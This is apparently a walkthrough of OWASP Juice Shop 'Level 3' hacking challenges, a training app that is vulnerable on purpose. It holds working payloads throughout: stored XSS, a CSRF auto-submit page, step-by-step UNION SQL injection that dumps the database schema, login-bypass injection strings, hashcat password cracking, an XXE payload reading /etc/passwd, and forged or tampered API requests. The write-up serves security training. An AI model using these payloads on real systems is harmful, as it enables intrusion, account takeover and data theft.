# Level 3

## API-only XSS (XSS)
_Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> without using the frontend application at all._

Following the [Product Tampering](#product-tampering-broken-access-control) challenge, we know we can modify the product
description:
```
PUT /api/Products/1
Content-type: application/json

{"description":"Hello <iframe src=\"javascript:alert(`xss`)\">"}
```

## Admin Registration (Improper Input Validation)
_Register as a user with administrator privileges._

Modify the body of the user registration request (`POST /api/Users/`) by adding `"role":"admin",`:
```
{
  "email": "admin@mail",
  "role": "admin",
  "password": "admin1",
  "passwordRepeat": "admin1",
  "securityQuestion": {
    "id": 1,
    "question": "Your eldest siblings middle name?",
    "createdAt": "2020-08-13T14:12:54.775Z",
    "updatedAt": "2020-08-13T14:12:54.775Z"
  },
  "securityAnswer": "Whatever"
}
```

## Bjoern's Favorite Pet (Broken Authentication)
_Reset the password of Bjoern's OWASP account via the Forgot Password mechanism with the original answer to his security question._

Bjoern's OWASP account email is `bjoern@owasp.org` (looking into Administration).

Google for `bjoern kimminich cat name`.
One of the sources is this YouTube video https://www.youtube.com/watch?v=Lu0-kDdtVf4 (4:20).

The pet's name is `Zaya`

## CAPTCHA Bypass (Broken Anti Automation)
_Submit 10 or more customer feedbacks within 10 seconds._

CAPTCHA is broken. The computation result is bound to `captchaId`.
We can simply bypass it by sending the same id, and the same result over and over again. 

Bash script to send the request 10 times:
```
for i in {1..10}
do
    curl -i -X POST \
        -H 'Content-Type: application/json' \
        --data '{"captchaId":6,"captcha":"14","comment":"AAA (anonymous)","rating":3}' \
        https://vernjan-juice-shop12.herokuapp.com/api/Feedbacks/
done
```

## CSRF (Broken Access Control)
_Change the name of a user by performing Cross-Site Request Forgery from [another origin](http://htmledit.squarefree.com/)._

This **no longer works in modern web browsers**.

The idea is to craft an HTML page similar to this:
```
<form action="YOUR_URL/profile" method="POST">
  <input type="text" id="username" name="username" value="John">
  <input type="submit" value="Submit">
</form> 
<script>document.forms[0].submit();</script>
```

Finally, send a link to this page to a victim. Once the victim visits the link, the form is auto-submitted
by the JavaScript and the victim's name is changed.

If you want to just solve the challenge without installing an old version of a browser,
you can intercept the request for a username change (`POST /profile`)
and add header `Origin: http://htmledit.squarefree.com`.

## Client-side XSS Protection (XSS)
_Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> bypassing a client-side security mechanism._

The hardest part is to find which field is vulnerable to XSS. For this challenge, you can exclude all fields which
- are not client-side validated,
- and their value is not persisted and shown on some other page.

The vulnerable field is `email` in User registration.

To solve the challenge, tamper with the request and change the email
into ```Hello <iframe src="javascript:alert(`xss`)">```.

## Database Schema (Injection)
_Exfiltrate the entire DB schema definition via SQL Injection._

We already know there's a SQLi vulnerability in the _Login_. Unfortunately, it does not print the returned
data on the screen.

We have 2 options now:
- Do [blind SQL injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
  (using for example [sqlmap](http://sqlmap.org/)) targeting _Login_. It's going to be quite slow.
- Find another SQLi entry which prints data back on the screen.

Searching for `rest/` through the main JS file `main-es2015.js` reveals entry point `/rest/products/search?q=`.
It looks perfect because it returns multiple results and prints them back on the screen.

### Step 1: Is it vulnerable to SQLi?
Let's start with a normal query:
```
GET /rest/products/search?q=Apple

{
  "status": "success",
  "data": [
    {
      "id": 1,
      "name": "Apple Juice (1000ml)",
      "description": "The all-time classic.",
      "price": 1.99,
      "deluxePrice": 0.99,
      "image": "apple_juice.jpg",
      "createdAt": "2020-08-20 06:11:49.815 +00:00",
      "updatedAt": "2020-08-20 06:11:49.815 +00:00",
      "deletedAt": null
    },
    {
      "id": 24,
      "name": "Apple Pomace",
      "description": "Finest pressings of apples. Allergy disclaimer: Might contain traces of worms. Can be <a href=\"/#recycle\">sent back to us</a> for recycling.",
      "price": 0.89,
      "deluxePrice": 0.89,
      "image": "apple_pressings.jpg",
      "createdAt": "2020-08-20 06:11:49.819 +00:00",
      "updatedAt": "2020-08-20 06:11:49.819 +00:00",
      "deletedAt": null
    }
  ]
}

Response code: 200 (OK); Time: 490ms; Content length: 631 bytes
```

Ok, all good. Now let's try this:
```
GET /rest/products/search?q=Apple'
..
<body>
<div id="wrapper">
    <h1>OWASP Juice Shop (Express ^4.17.1)</h1>
    <h2><em>500</em> SequelizeDatabaseError: SQLITE_ERROR: near &quot;&#39;%&#39;&quot;: syntax error</h2>
    <ul id="stacktrace">
        <li> &nbsp; &nbsp;at Query.formatError (/app/node_modules/sequelize/lib/dialects/sqlite/query.js:422:16)</li>
        <li> &nbsp; &nbsp;at Query._handleQueryResponse
            (/app/node_modules/sequelize/lib/dialects/sqlite/query.js:73:18)
        </li>
        <li> &nbsp; &nbsp;at afterExecute (/app/node_modules/sequelize/lib/dialects/sqlite/query.js:250:31)</li>
        <li> &nbsp; &nbsp;at replacement (/app/node_modules/sqlite3/lib/trace.js:19:31)</li>
        <li> &nbsp; &nbsp;at Statement.errBack (/app/node_modules/sqlite3/lib/sqlite3.js:14:21)</li>
    </ul>
</div>
</body>
</html>

Response code: 500 (Internal Server Error); Time: 333ms; Content length: 1534 bytes
```

Whoops, `SQLITE_ERROR: near "'%'": syntax error`.
There we have our SQLi vulnerability and, on top of that,
we know it's [SQLite](https://www.sqlite.org/index.html) database.

### Step 2: Inject custom query
I had a bit hard time injecting a custom query. Simply commenting out the rest of the original query doesn't work:
```
GET /rest/products/search?q=Apple'--

SequelizeDatabaseError: SQLITE_ERROR: incomplete input
```

The query is incomplete. After a bit of googling I figured out I'm missing closing parentheses:
```
GET /rest/products/search?q=Apple'))--

{
  "status": "success",
  "data": []
}

Response code: 200 (OK); Time: 243ms; Content length: 30 bytes
```

Cool, now we are ready for injection.

### Step 3: Get the number of columns
The next step is to determine the number of columns in the original "Products" table so that we can use `UNION SELECT`
to fetch data from another table.

```
GET /rest/products/search?q=Apple'))+UNION+SELECT+null--

SequelizeDatabaseError: SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns
```

Ok, that's good, we just need to find the correct number of columns.
```
GET /rest/products/search?q=Apple'))+UNION+SELECT+null,null--
GET /rest/products/search?q=Apple'))+UNION+SELECT+null,null,null--
..
GET /rest/products/search?q=Apple'))+UNION+SELECT+null,null,null,null,null,null,null,null,null--
TypeError: Cannot read property "locale" of null
```

So it's 9 columns. This new error is coming from the application (not database). We can fix it easily
like this:
```
GET /rest/products/search?q=Apple'))+UNION+SELECT+'a','b','c',null,null,null,null,null,null--

{
  "status": "success",
  "data": [
    {
      "id": "a",
      "name": "b",
      "description": "c",
      "price": null,
      "deluxePrice": null,
      "image": null,
      "createdAt": null,
      "updatedAt": null,
      "deletedAt": null
    }
  ]
}

Response code: 200 (OK); Time: 301ms; Content length: 165 bytes
```

### Step 4: Where does SQLite store DB schema?
A bit of googling tell us it's `sqlite_master` table.
See [Injecting SQLite database based application](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf).

The most interesting column is `sql`.

### Step 5: Exfiltrate the DB schema
Time to put together the final payload:
```
GET /rest/products/search?q=Apple'))+UNION+SELECT+'a','b','c',sql,null,null,null,null,null+FROM+sqlite_master--

{
  "status": "success",
  "data": [
    {
      "id": "a",
      "name": "b",
      "description": "c",
      "price": null,
      "deluxePrice": null,
      "image": null,
      "createdAt": null,
      "updatedAt": null,
      "deletedAt": null
    },
    {
      "id": "a",
      "name": "b",
      "description": "c",
      "price": "CREATE TABLE `Addresses` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `fullName` VARCHAR(255), `mobileNum` INTEGER, `zipCode` VARCHAR(255), `streetAddress` VARCHAR(255), `city` VARCHAR(255), `state` VARCHAR(255), `country` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE SET NULL ON UPDATE CASCADE)",
      "deluxePrice": null,
      "image": null,
      "createdAt": null,
      "updatedAt": null,
      "deletedAt": null
    },
    {
      "id": "a",
      "name": "b",
      "description": "c",
      "price": "CREATE TABLE `BasketItems` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `quantity` INTEGER, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `BasketId` INTEGER REFERENCES `Baskets` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, `ProductId` INTEGER REFERENCES `Products` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, UNIQUE (`BasketId`, `ProductId`))",
      "deluxePrice": null,
      "image": null,
      "createdAt": null,
      "updatedAt": null,
      "deletedAt": null
    },
    ..
```

Finally, I extracted the queries into [db-schema.sql](misc/db-schema.sql).
```
cat dump.json | jq .data[].price | tail -n +2 | tr -d '"' > db-dump.sql
```
It will surely come handy later.

## Deluxe Fraud (Improper Input Validation)
_Obtain a Deluxe Membership without paying for it._

Log in as a standard customer (not admin) and pay for the Deluxe membership (in top left menu).

This is the important request:
```
POST YOUR_URL/rest/deluxe-membership
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9. ..
Content-Type: application/json

{"paymentMode":"card"}
```

Create a new user and replay this request with the following body (also update the `Authorization` header):
```
{"paymentMode":""}
```

## Forged Feedback (Broken Access Control) 
_Post some feedback in another users name._

Log in and post a feedback. Then modify `userId` in the request body and resend it.
```
POST /api/Feedbacks/
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9
Content-Type: application/json

{"status":"success","data":{"id":19,"UserId":2,"comment":"AAAAAAA (***in@juice-sh.op)","rating":3,"updatedAt":"2020-08-20T14:08:30.102Z","createdAt":"2020-08-20T14:08:30.102Z"}}
```

## Forged Review (Broken Access Control) 
_Post a product review as another user or edit any user's existing review._

Log in and post a review. Then modify `author` in the request body and resend it.

```
PUT /rest/products/1/reviews
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9
Content-Type: application/json

{"message":"Not Jim's review","author":"jim@juice-sh.op"}
```

## GDPR Data Erasure (Broken Authentication)
_Log in with Chris' erased user account._

TODO

## Login Amy (Sensitive Data Exposure)
_Log in with Amy's original user credentials. (This could take 93.83 billion trillion trillion centuries to brute force, but luckily she did not read the "One Important Final Note")_

Googling for `"One Important Final Note"` points to https://www.grc.com/haystack.htm?1. An interesting technique for making
memorable passwords. 

Read the "One Important Final Note" to understand the core of this challenge. We can assume that Amy's password is short
and padded with `....` to 24 characters (based on the _93.83 billion trillion trillion centuries_ cracking time).

First step is to get Amy's password hash. The same process as in
[Password Strength](level2.md#password-strength-broken-authentication) challenge.

The hash is: `030f05e45e30710c3ad3c32f00de0473`

I used [hashcat](https://hashcat.net/hashcat/) for cracking the password:
```
echo 030f05e45e30710c3ad3c32f00de0473 > hashes.txt
$ hashcat -a 3 -d 3 -m 0 hashes.txt -1 '?l?u?d' '?1?1?1.....................'
..
Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: 030f05e45e30710c3ad3c32f00de0473
Time.Started.....: Tue Sep  1 16:57:58 2020 (1 min, 11 secs)
Time.Estimated...: Tue Sep  1 16:59:09 2020 (0 secs)
Guess.Mask.......: ?1?1?1..................... [24]
Guess.Charset....: -1 ?l?u?d, -2 Undefined, -3 Undefined, -4 Undefined
Guess.Queue......: 1/1 (100.00%)
Speed.#3.........:     1541 H/s (0.20ms) @ Accel:256 Loops:32 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 108672/238328 (45.60%)
Rejected.........: 0/108672 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#3...: Salt:0 Amplifier:108640-108672 Iteration:0-32
Candidates.#3....: g0h..................... -> K1f.....................
```

- `-a 3` is for brute-force attack
- `-d 3` is for running on my dedicated graphics card
- `-m 0` is for MD5
- `-1 '?l?u?d'` is a custom charset with lower and uppers case letters and digits (see https://hashcat.net/wiki/doku.php?id=mask_attack for details)
- `'?1?1?1.....................'` is a password mask

Once _hashcat_ is done, read the password:
```
$ hashcat hashes.txt --show
030f05e45e30710c3ad3c32f00de0473:K1f.....................
```

Amy's password is `K1f.....................`

## Login Bender (Injection)
_Log in with Bender's user account._

The same as [Login Jim](#login-jim-injection) challenge.

## Login Jim (Injection)
_Log in with Jim's user account._

We need two things: email and password

Email is easy. Once you have the admin access, you can see it in _Administration_. It's `jim@juice-sh.op`.

To bypass the password check, we can use a simple SQL injection:
`jim@juice-sh.op';` or `jim@juice-sh.op'--`

## Manipulate Basket (Broken Access Control)
_Put an additional product into another user's shopping basket._

I found an alternative solution for this challenge which is, however, not recognized as the correct one. 
I created Juice shop bug [#1452](https://github.com/bkimminich/juice-shop/issues/1452).

### 1) Create new basket item
```
POST /api/BasketItems/
Content-type: application/json

{"quantity":3,"ProductId":19}
---
{"status":"success","data":{"id":21,"ProductId":19,"quantity":3,"updatedAt":"2020-08-26T22:22:36.821Z","createdAt":"2020-08-26T22:22:36.821Z"}}
```

The trick here is to delete the `basketId` property! New basket item is created with `null` basketId.
Just to confirm it:
```
GET /api/BasketItems/21
---
{"status":"success","data":{"id":21,"quantity":3,"createdAt":"2020-08-26T22:22:36.821Z","updatedAt":"2020-08-26T22:22:36.821Z","BasketId":null,"ProductId":19}}
```

### 2) Add basket item to basket
Now we can put the basket item into another user's basket (this wouldn't possible if the basket item
had already been in someone's basket):
```
PUT /api/BasketItems/21
Content-type: application/json

{"BasketId":"8"}
---
{"status":"success","data":{"id":21,"quantity":3,"createdAt":"2020-08-26T22:22:36.821Z","updatedAt":"2020-08-26T22:23:45.932Z","BasketId":"8","ProductId":19}}
```

## Payback Time (Improper Input Validation)
_Place an order that makes you rich._

Add some products to your basket and then change the quantity. The following request is sent:
```
PUT /api/BasketItems/9
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.
Content-Type: application/json

{"quantity":5}
```

Change the quantity to a negative number and finish the order.

## Privacy Policy Inspection (Security through Obscurity)
_Prove that you actually read our privacy policy._

While reading the privacy policy, you can notice that some words get highlighted on the mouse hover:
![](images/privacy-policy-hot.png)

Inspect the highlighted word with DevTools and notice that it has CSS class `hot`.
Search for all `hot` classes to get the following words:
```
https://vernjan-juice-shop.herokuapp.com
We may also
instruct you
to refuse all
reasonably necessary
responsibility
```

I had now idea I should turn those words into a link but once I googled for them,
Google spoilt the solution in the search results previews.

Go to https://vernjan-juice-shop.herokuapp.com/We/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility

The response is also weird but maybe it will come to use later?
```
404 Error: ENOENT: no such file or directory, stat '/app/frontend/dist/frontend/assets/private/thank-you.jpg'
```

## Product Tampering (Broken Access Control)
_Change the href of the link within the OWASP SSL Advanced Forensic Tool (O-Saft) product description into https://owasp.slack.com._

We know there's `/api/Products` endpoint. Looking into `/main-es2015.js` or just simply guessing we can discover it also
accepts `PUT` requests.

Let's use it to modify the existing product (id is `9`). Do not forget to add `Content-Type: application/json` header!

```
PUT /api/Products/9
Content-type: application/json

{"description":"O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href=\"https://owasp.slack.com\" target=\"_blank\">More...</a>"}
```

## Reset Jim's Password (Broken Authentication)
_Reset Jim's password via the Forgot Password mechanism with the original answer to his security question._

Given the answer is a common name, it can be easily guessed. I downloaded a list of 200 most common names.
See [names.txt](misc/names.txt).

To automate the guessing process, I used [OWASP Zap Fuzzer](https://www.zaproxy.org/docs/desktop/addons/fuzzer/).

The sibling's name is `Samuel`. 

## Upload Size (Improper Input Validation)
_Upload a file larger than 100 kB._

The file size is validated with JavaScript. We can easily bypass using curl:
```
BEARER='eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9. ..'
curl -v -i -X POST -H "Authorization: Bearer $BEARER" -F 'file=@150kb.txt' https://vernjan-juice-shop.herokuapp.com/file-upload
```

Just make sure the file is not larger than `200 kB` (this is server-side validated).

## Upload Type (Improper Input Validation)
_Upload a file that has no .pdf or .zip extension._

The same as [Upload Size](#upload-size-improper-input-validation) challenge.

## XXE Data Access (XXE)
_Retrieve the content of `C:\Windows\system.ini` or `/etc/passwd` from the server._

Start with [](level2.md#deprecated-interface-security-misconfiguration) challenge.

Upload the following payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<hello>&xxe;</hello>
```

The response is:
```
410 Error: B2B customer complaints via file upload have been deprecated for security reasons: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><stockCheck><productId>root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/bin/shman:x:6:12:man:/var/cache/man:/bin/shlp:x:7:7:lp:/var/spool/lpd:/bin/shmail:x:8:8:mail:/v... (xxe.xml)
```
